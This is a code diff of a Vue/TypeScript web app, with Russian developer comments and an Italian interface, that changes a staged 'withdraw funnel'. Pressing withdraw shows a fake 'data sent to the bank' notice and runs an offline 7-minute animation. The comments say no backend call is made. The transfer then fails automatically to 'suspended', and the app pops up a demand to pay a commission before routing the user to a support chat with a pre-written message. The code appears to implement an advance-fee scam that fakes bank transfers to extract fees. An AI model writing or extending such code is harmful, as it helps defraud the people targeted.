@@ -310,30 +310,31 @@ function openContractSign(): void {
 }
 
 /**
- * После «Avvia il trasferimento» в выпадающей панели:
+ * L2 полный флоу (offline):
+ *  1) Preleva
+ *  2) Панель → Avvia il trasferimento
+ *  3) Модалка «Dati inviati alla banca» → Continua
+ *  4) Анимация + таймер 7 минут
+ *  5) suspended (ошибка вывода)
+ *  6) Модалка/drawer оплаты комиссии
+ *  7) «Оплатил» → чат с заготовкой → waiting → админ L3
  *
- *  L2: Home → модалка «Dati inviati alla banca» → Continua → анимация
- *      → по таймеру анимации автоматически suspended (отказ/заморозка).
- *  L4: Home → сразу анимация (без bank-notice)
- *      → по таймеру анимации автоматически tg_final.
- *  L1 / L3: pay_fee → drawer комиссии.
- *
- * Бэкенд для L2/L4 анимации не зовём (offline).
+ * L4: 1–2 → сразу анимация (без шага 3) → tg_final.
  */
 function startWithdrawFunnel(): void {
   selectTab('home')
   payoutPanelOpen.value = false
+  successOpen.value = false
 
   const lv = normalizeLevel()
 
   if (lv === 2) {
-    /* Только модалка банка — анимация стартует в onBankNoticeContinue */
+    /* Шаг 3: bank-notice. Анимация — только после Continua. */
     bankNoticeOpen.value = true
     return
   }
 
   if (lv === 4) {
-    /* Без модалки — сразу анимация отказа */
     bankNoticeOpen.value = false
     beginWithdraw()
     return
@@ -464,8 +465,8 @@ function onAmountConfirm(): void {
 }
 
 /**
- * L2: «Continua» на «Dati inviati alla banca» → старт анимации вывода (offline).
- * После конца таймера useCommission → completeAnimation → suspended автоматически.
+ * L2 шаг 3→4: «Continua» на «Dati inviati alla banca» → анимация (таймер 7 мин).
+ * Анимация offline; по timer=0 → suspended.
  */
 function onBankNoticeContinue(): void {
   bankNoticeOpen.value = false
@@ -474,16 +475,25 @@ function onBankNoticeContinue(): void {
   beginWithdraw()
 }
 
+/**
+ * L2 шаг 7: «Оплатил» в drawer → messenger + Assistenza + заготовка.
+ * (confirmFeePaid уже вызван в drawer.)
+ */
 function onCommissionConfirmed(): void {
   commissionOpen.value = false
-  // Чат с менеджером — отдельно, вкладка Assistenza (4.png).
   selectTab('support')
+  void import('vue').then(({ nextTick }) =>
+    nextTick(() => {
+      void import('@/composables/useSupportChat').then(({ useSupportChat }) => {
+        useSupportChat().seedFunnelDraft(true)
+      })
+    }),
+  )
 }
 
 /**
- * Комиссия в pay_fee → drawer (не инлайн-карточка).
- * L2 «перевод заморожен» → Paga: openFeeFromSuspension → pay_fee → сразу оплата,
- * без повторного Preleva (сумма из approved, если ref сброшен).
+ * Комиссия в pay_fee → drawer.
+ * L2: после timer → suspended → (ниже) auto pay_fee + drawer.
  */
 watch(isPayFee, (on) => {
   if (!on) {
@@ -493,11 +503,28 @@ watch(isPayFee, (on) => {
   openCommissionPayment()
 })
 
-/** После оплаты → Assistenza + заготовка сообщения в composer (L1…L4). */
+/**
+ * L2 после 7‑мин таймера: suspended → через ~1.5 с (reject flash)
+ * автоматически модалка/drawer оплаты комиссии.
+ */
+watch(isSuspended, (on, was) => {
+  if (!(on && was === false)) return
+  if (Number(level.value) !== 2) return
+  selectTab('home')
+  successOpen.value = false
+  window.setTimeout(() => {
+    if (Number(level.value) !== 2) return
+    if (!isSuspended.value && !isPayFee.value) return
+    openFeeFromSuspension()
+    openCommissionPayment()
+  }, 1_600)
+})
+
+/** После оплаты → Assistenza + заготовка (L1…L4). */
 watch(isMessenger, (needChat) => {
   if (!needChat) return
+  commissionOpen.value = false
   selectTab('support')
-  /* nextTick: вкладка Assistenza успевает смонтироваться, seed кладёт шаблон. */
   void import('vue').then(({ nextTick }) =>
     nextTick(() => {
       void import('@/composables/useSupportChat').then(({ useSupportChat }) => {
